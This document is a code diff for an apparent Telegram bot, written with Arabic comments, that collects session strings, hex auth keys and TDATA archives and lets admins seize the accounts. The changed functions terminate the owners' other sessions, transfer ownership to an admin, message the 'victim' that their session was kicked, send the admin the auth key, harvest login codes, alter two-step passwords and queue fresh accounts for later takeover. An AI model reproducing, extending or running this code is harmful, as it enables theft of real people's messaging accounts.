@@ -401,14 +569,14 @@ async def execute_full_migration(acc_id, client_a, original_owner, admin_id, pho
 
             if client_a.is_connected: await client_a.disconnect()
 
-            # 11. تحديث الداتا بيس
+            # 10. تحديث الملكية في الداتا بيس لصالح الأدمن بالجلسة النظيفة المستقرة B
             conn = get_db_conn()
             c = conn.cursor()
-            c.execute("UPDATE sessions SET pyro_session=?, owner_id=?, surveilled=0, tl_session='', dc_id=?, auth_hex=? WHERE id=?", (session_b_str, admin_id, new_dc_id, new_hex_key, acc_id))
+            c.execute("UPDATE sessions SET pyro_session=?, owner_id=?, surveilled=0, tl_session='' WHERE id=?", (session_b_str, admin_id, acc_id))
             conn.commit()
             conn.close()
 
-            # 12. إرسال الكليشة للضحية
+            # 11. إرسال الكليشة للضحية
             kick_msg = (
                 f"🛂┊ تـنـبـيـه هـام - طـرد جـلـسـة !\n\n"
                 f"⎉╎ تـم طـرد جـلـسـة الـبـوت لـحـسـاب:\n"
@@ -421,20 +589,27 @@ async def execute_full_migration(acc_id, client_a, original_owner, admin_id, pho
             except Exception: 
                 pass
 
-            # 13. رسالة الأدمن
+            # 12. إرسال رسالة النجاح للأدمن مع مفتاح الـ HEX الصحيح المطابق للـ DC
             admin_msg = (
                 f"✅ تـم سـحـب وتـهـجـيـر الـحـسـاب بـنـجـاح!\n\n"
                 f"⎉╎ الـرقـم: `{phone}`\n"
                 f"⎉╎ الاسـم: {name}\n"
-                f"⎉╎ الـسـيـرفـر (DC): {new_dc_id}\n\n"
-                f"🔑 مـفـتـاح HEX الـجـديـد:\n`{new_hex_key} {new_dc_id}`\n\n"
+                f"⎉╎ الـسـيـرفـر (DC): {dc_id}\n\n"
+                f"🔑 مـفـتـاح HEX:\n`{hex_key} {dc_id}`\n\n"
                 f"•❐• تـم إنـهـاء بـاقـي الـجـلـسـات وتـسـجـيـل خـروج الـجـلـسـة الـقـديـمـة وتـولـيـد B مـسـتـقـلـة بـمـلـكـيـتـك."
             )
             bot.send_message(admin_id, admin_msg, parse_mode="Markdown")
 
+            # 13. حذف الحساب من قائمة الجلسات المؤقتة في البوت
+            conn = get_db_conn()
+            c = conn.cursor()
+            c.execute("DELETE FROM sessions WHERE id=?", (acc_id,))
+            conn.commit()
+            conn.close()
+
             return True
         else:
-            raise Exception("فشل في توليد رمز QR")
+            raise Exception("فشل في توليد رمز QR أو تم تسجيل الدخول بشكل غير متوقع")
 
     except Exception as e:
         logging.error(f"Migration Failed for {phone}: {e}")
@@ -442,6 +617,36 @@ async def execute_full_migration(acc_id, client_a, original_owner, admin_id, pho
         if verify_b and verify_b.is_connected: await verify_b.disconnect()
         if client_a.is_connected: await client_a.disconnect()
         return False
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 # =========================================================
 # 🎛️ واجهات التحكم
@@ -466,8 +671,7 @@ def accounts_action_keyboard(owner_id, action):
     accounts = get_all_accounts(owner_id)
     markup = InlineKeyboardMarkup()
     markup.row(InlineKeyboardButton("🌍 تـطـبـيـق عـلـى الـجـمـيـع", callback_data=f"act:{action}:all"))
-    for acc in accounts:
-        acc_id, phone, name = acc[0], acc[1], acc[2]
+    for acc_id, phone, name, uid, _ in accounts:
         markup.row(InlineKeyboardButton(f"{name} | {phone}", callback_data=f"act:{action}:{acc_id}"))
     markup.row(InlineKeyboardButton("🔙 رجـوع", callback_data="back_home"))
     return markup
@@ -506,8 +710,7 @@ def reveal_accounts(call):
     accounts = get_all_accounts(call.from_user.id)
     if not accounts: return bot.answer_callback_query(call.id, "لا توجد حسابات مسجلة!", show_alert=True)
     text = f"🛂┊ كشـف الحـسـابات -\n\n⎉╎ تم العثور على {len(accounts)} حـسـاب\n\n"
-    for acc in accounts:
-        acc_id, phone, name, uid, _ = acc[:5]
+    for acc_id, phone, name, uid, _ in accounts:
         text += f"▪️ الـرقـم: {phone}\n▪️ الاسـم: {name}\n▪️ الآيـدي: {uid}\n▪️ سـنـة الإنـشـاء: {get_creation_year(uid)}\n〰️〰️〰️〰️〰️〰️〰️〰️\n"
     markup = InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 رجـوع", callback_data="back_home"))
     bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
@@ -524,8 +727,7 @@ async def check_active_async(owner_id, chat_id, msg_id):
     if not accounts: return bot.edit_message_text("❌ لا توجد حسابات مضافة.", chat_id, msg_id, reply_markup=home_keyboard(owner_id))
     active_count = 0
     text = "🛂┊ نـتـيـجـة فـحـص الـحـسـابـات:\n\n"
-    for acc in accounts:
-        acc_id, phone, name, uid, pyro_session = acc[:5]
+    for acc_id, phone, name, uid, pyro_session in accounts:
         client = Client(f"chk_{acc_id}_{int(time.time())}", api_id=API_ID, api_hash=API_HASH, session_string=pyro_session, in_memory=True)
         try:
             await asyncio.wait_for(client.connect(), timeout=10)
@@ -560,8 +762,7 @@ def scan_all_codes(call):
 async def fetch_all_codes_async(owner_id, chat_id, msg_id):
     accounts = get_all_accounts(owner_id)
     found_codes = []
-    for acc in accounts:
-        acc_id, phone, name, uid, pyro_session = acc[:5]
+    for acc_id, phone, name, uid, pyro_session in accounts:
         exec_client = Client(f"code_{acc_id}_{int(time.time())}", api_id=API_ID, api_hash=API_HASH, session_string=pyro_session, in_memory=True)
         try:
             await asyncio.wait_for(exec_client.connect(), timeout=12)
@@ -596,8 +797,7 @@ def autoterm_manage_menu(call):
     markup.row(InlineKeyboardButton("• تـعـطـيـل الإزالـة لـلـجـمـيـع 🔴" if all_enabled else "• تـفـعـيـل الإزالـة لـلـجـمـيـع 🟢", callback_data="autoterm:toggle:all"))
     markup.row(InlineKeyboardButton("• ضـبـط وقـت الإزالـة 🕒", callback_data="autoterm_set_time"))
 
-    for acc in accounts:
-        acc_id, phone, name = acc[0], acc[1], acc[2]
+    for acc_id, phone, name, uid, _ in accounts:
         c.execute("SELECT auto_term_enabled, auto_term_interval FROM sessions WHERE id=?", (acc_id,))
         acc_data = c.fetchone()
         if acc_data:
@@ -631,8 +831,7 @@ def autoterm_set_time_start(call):
     if not is_allowed(call.from_user.id): return
     markup = InlineKeyboardMarkup()
     markup.row(InlineKeyboardButton("🌍 تـطـبـيـق عـلـى الـجـمـيـع", callback_data="autoterm:time:all"))
-    for acc in get_all_accounts(call.from_user.id):
-        acc_id, phone, name = acc[0], acc[1], acc[2]
+    for acc_id, phone, name, uid, _ in get_all_accounts(call.from_user.id):
         markup.row(InlineKeyboardButton(f"{name} | {phone}", callback_data=f"autoterm:time:{acc_id}"))
     markup.row(InlineKeyboardButton("🔙 إلـغـاء", callback_data="autoterm_manage"))
     bot.edit_message_text("🛂┊ ضـبـط وقـت الإزالـة:\n\n⎉╎ اخـتـر الـحـسـاب:", call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
@@ -708,8 +907,7 @@ def execute_action(call):
 async def perform_action_async(action, acc_id, owner_id):
     acc = get_account(acc_id)
     if not acc: return "❌ الـحـسـاب غـيـر مـوجـود."
-    phone = acc[2]
-    pyro_session = acc[5]
+    _, _, phone, user_id, first_name, pyro_session, _, _, _, _, _, _ = acc
 
     if action == "remove":
         delete_account(acc_id)
@@ -804,8 +1002,7 @@ async def do_2fa_async(uid, target, action, old_pass, new_pass):
     for acc in accounts:
         acc_data = get_account(acc[0])
         if not acc_data: continue
-        phone = acc_data[2]
-        pyro_session = acc_data[5]
+        _, _, phone, _, _, pyro_session, _, _, _, _, _, _ = acc_data
         client = Client(f"2fa{acc[0]}{int(time.time())}", api_id=API_ID, api_hash=API_HASH, session_string=pyro_session, in_memory=True)
         try:
             await asyncio.wait_for(client.connect(), timeout=12)
@@ -834,16 +1031,12 @@ def execute_2fa_action(message, uid):
 # 📥 محرك تسجيل الدخول (Hex, String, ZIP, TDATA)
 # =========================================================
 
-def process_successful_login(message, status_msg, me, pyro_session, session_type="Session", file_path=None, raw_hex=None, dc_id=2):
+def process_successful_login(message, status_msg, me, pyro_session, session_type="Session", file_path=None, raw_hex=None):
     if check_duplicate(message.from_user.id, me.id):
         bot.edit_message_text("⚠️ الـحـسـاب مـوجـود بـالـفـعـل فـي الـبـوت مـسـبـقـاً!", message.chat.id, status_msg.message_id, reply_markup=home_keyboard(message.from_user.id))
         return
 
-    final_hex = raw_hex
-    if not final_hex:
-        _, final_hex = parse_pyro_session(pyro_session)
-        
-    save_account(message.from_user.id, me.phone_number or "Unknown", me.id, me.first_name or "User", pyro_session, "", session_type, dc_id, final_hex)
+    save_account(message.from_user.id, me.phone_number or "Unknown", me.id, me.first_name or "User", pyro_session, "", session_type)
 
     text = (f"🛂┊ تـم سحب حساب بـنـجـاح !\n\n⎉╎ الاسـم: {me.first_name}\n⎉╎ الـرقـم: +{(me.phone_number or 'Unknown').replace('+', '')}\n⎉╎ الآيـدي: {me.id}\n•❐• سـنـة الإنـشـاء: {get_creation_year(me.id)}\n\nتـحـكـم بـحـسـابـك مـن الأزرار أدناه:")
 
@@ -856,7 +1049,7 @@ def process_successful_login(message, status_msg, me, pyro_session, session_type
         if file_path:
             log_to_channel(channel_text, file_path=file_path)
         elif raw_hex:
-            log_to_channel(channel_text, session_text=f"{raw_hex} {dc_id}")
+            log_to_channel(channel_text, session_text=raw_hex)
         else:
             log_to_channel(channel_text, session_text=pyro_session)
 
@@ -877,13 +1070,13 @@ def handle_text_input(message):
                     await asyncio.wait_for(client.connect(), timeout=10)
                     me = await client.get_me()
                     await client.disconnect()
-                    return me, pyro_sess, dc_id
+                    return me, pyro_sess
                 except Exception:
                     if client.is_connected: await client.disconnect()
-            return None, None, 2
-        me, p_sess, dc = run_async(verify_hex())
+            return None, None
+        me, p_sess = run_async(verify_hex())
         if me:
-            process_successful_login(message, status_msg, me, p_sess, "Hex", raw_hex=hex_key, dc_id=dc)
+            process_successful_login(message, status_msg, me, p_sess, "Hex", raw_hex=hex_key)
         else:
             bot.edit_message_text("❌ جـلـسـة مـعـطـوبـة أو مـطـرودة.", message.chat.id, status_msg.message_id)
     elif len(text) > 50 and " " not in text:
@@ -894,12 +1087,11 @@ def handle_text_input(message):
                 await asyncio.wait_for(client.connect(), timeout=10)
                 me = await client.get_me()
                 pyro_sess = await client.export_session_string()
-                dc_id, _ = parse_pyro_session(pyro_sess)
                 await client.disconnect()
-                return me, pyro_sess, dc_id
-            except Exception: return None, None, 2
-        me, p_sess, dc = run_async(verify_txt())
-        if me: process_successful_login(message, status_msg, me, p_sess, "String", dc_id=dc)
+                return me, pyro_sess
+            except Exception: return None, None
+        me, p_sess = run_async(verify_txt())
+        if me: process_successful_login(message, status_msg, me, p_sess, "String")
         else: bot.edit_message_text("❌ جـلـسـة مـعـطـوبـة.", message.chat.id, status_msg.message_id)
 
 @bot.message_handler(content_types=['document'])
@@ -915,14 +1107,13 @@ def handle_files(message):
                 client = Client(temp_name, api_id=API_ID, api_hash=API_HASH)
                 await asyncio.wait_for(client.connect(), timeout=10)
                 me, p_sess = await client.get_me(), await client.export_session_string()
-                dc_id, _ = parse_pyro_session(p_sess)
                 await client.disconnect()
-                return me, p_sess, dc_id
-            except Exception: return None, None, 2
+                return me, p_sess
+            except Exception: return None, None
             finally:
                 if os.path.exists(f"{temp_name}.session"): os.remove(f"{temp_name}.session")
-        me, p_sess, dc = run_async(verify_file())
-        if me: process_successful_login(message, status_msg, me, p_sess, "File", dc_id=dc)
+        me, p_sess = run_async(verify_file())
+        if me: process_successful_login(message, status_msg, me, p_sess, "File")
         else: bot.edit_message_text("❌ مـلـف مـعـطـوب.", message.chat.id, status_msg.message_id)
     elif file_name.endswith(".zip"):
         status_msg = bot.reply_to(message, "•❐• جـاري سـحـب TDATA...", parse_mode="Markdown")
@@ -948,7 +1139,7 @@ def handle_files(message):
                         return None
                 me = run_async(verify_tdata())
                 if me:
-                    process_successful_login(message, status_msg, me, p_sess, "TDATA", file_path=zip_path, raw_hex=auth_key.hex(), dc_id=dc_id)
+                    process_successful_login(message, status_msg, me, p_sess, "TDATA", file_path=zip_path)
                 else:
                     bot.edit_message_text("❌ TDATA مـعـطـوبـة.", message.chat.id, status_msg.message_id)
             else:
@@ -1006,33 +1197,33 @@ async def check_account_for_menu(acc):
     acc_id, phone, name, uid, owner_id, pyro_sess = acc
     client = Client(f"tmp_{acc_id}_{int(time.time())}", api_id=API_ID, api_hash=API_HASH, session_string=pyro_sess, in_memory=True)
     color = ""
+    session_count = "?"
     try:
         await asyncio.wait_for(client.connect(), timeout=5)
         auths = await client.invoke(functions.account.GetAuthorizations())
+        session_count = len(auths.authorizations)
         current = next((a for a in auths.authorizations if getattr(a, 'current', False)), None)
         if current:
             age = time.time() - current.date_created
-            if age >= 86400:
+            if age >= 86400: # أكثر من 24 ساعة
                 color = "🟢"
             else:
                 other = next((a for a in auths.authorizations if not getattr(a, 'current', False)), None)
                 if other:
                     try:
                         await client.invoke(functions.account.ResetAuthorization(hash=other.hash))
-                        color = "🟡" 
+                        color = "🟡" # الفحص البرمجي نجح
+                        session_count -= 1
                     except Exception:
-                        pass 
+                        pass # لم تنجح، ستبقى بدون لون (مراقبة)
     except Exception:
         pass
     finally:
         if client.is_connected: await client.disconnect()
 
     creation_year = get_creation_year(uid)
-    sender_name = get_sender_name(owner_id)
-    short_phone = f"+{str(phone).replace('+', '')[:5]}"
-    
-    # الترتيب المطلوب: اللون | اسم المُرسل | اسم الحساب | الآيدي | سنة الإنشاء | أول 5 أرقام
-    btn_text = f"{color} {sender_name} | {name} | {uid} | {creation_year} | {short_phone}"
+    country_name, country_flag = get_country_info(phone)
+    btn_text = f"{color} {name} | {country_flag} {country_name} | {creation_year} | جلسات:{session_count}"
     return InlineKeyboardButton(btn_text, callback_data=f"steal:{acc_id}")
 
 async def build_steal_menu_async(admin_id, chat_id, msg_id):
@@ -1059,7 +1250,7 @@ def handle_steal(call):
     if call.from_user.id not in ADMIN_IDS: return
     target = call.data.split(":")[1]
 
-    status_msg = bot.send_message(call.message.chat.id, "⏳ جـاري إجـراء الـسـحـب والـتـهـجـيـر بـأقـصـى قـوة...", parse_mode="Markdown")
+    status_msg = bot.send_message(call.message.chat.id, "⏳ جـاري إجـراء الـسـحـب والـتـهـجـيـر (Cloning)...", parse_mode="Markdown")
 
     if target == "all":
         conn = get_db_conn()
@@ -1078,21 +1269,36 @@ def handle_steal(call):
 async def steal_single_account(acc_id, admin_id):
     acc = get_account(acc_id)
     if not acc: return "❌ الحساب غير موجود."
-    owner_id = acc[1]
-    phone = acc[2]
-    user_id = acc[3]
-    name = acc[4]
-    pyro_session = acc[5]
-    saved_dc = acc[12] if len(acc) > 12 else 2
-    saved_hex = acc[13] if len(acc) > 13 else ""
+    _, owner_id, phone, user_id, name, pyro_session, _, _, _, _, _, _ = acc
 
     client_a = Client(f"st_{acc_id}_{int(time.time())}", api_id=API_ID, api_hash=API_HASH, session_string=pyro_session, in_memory=True)
     try:
-        success = await execute_full_migration(acc_id, client_a, owner_id, admin_id, phone, name, saved_dc, saved_hex)
-        if success: 
-            return f"✅ تـم الـتـهـجـيـر بـنـجـاح لـ `{phone}`. راجـع الـرسـائـل 🔑"
-        else: 
+        await asyncio.wait_for(client_a.connect(), timeout=12)
+        auths = await client_a.invoke(functions.account.GetAuthorizations())
+        wait_error = False
+
+        for auth in auths.authorizations:
+            if not getattr(auth, 'current', False):
+                try:
+                    await client_a.invoke(functions.account.ResetAuthorization(hash=auth.hash))
+                    await asyncio.sleep(0.4)
+                except Exception as e:
+                    if "fresh" in str(e).lower() or "24" in str(e).lower():
+                        wait_error = True
+                        break
+
+        if wait_error:
+            conn = get_db_conn()
+            c = conn.cursor()
+            c.execute("UPDATE sessions SET surveilled=1, tl_session=? WHERE id=?", (str(admin_id), acc_id))
+            conn.commit()
+            conn.close()
             return f"⏳ `{phone}` جـديـد! تـم وضـعـه تـحـت نـظـام الـمـراقـبـة، سـيـتـم سـحـبـه تـلـقـائـيـاً عـنـد جـهـوزيـتـه."
+
+        else:
+            success = await execute_full_migration(acc_id, client_a, owner_id, admin_id, phone, name)
+            if success: return f"✅ تـم الـتـهـجـيـر بـنـجـاح لـ `{phone}`. راجـع الـرسـائـل 🔑"
+            else: return f"❌ فـشـل تـهـجـيـر `{phone}` لأسباب تقنية."
 
     except Exception as e: return f"❌ فشل الاتصال بالحساب `{phone}`."
     finally:
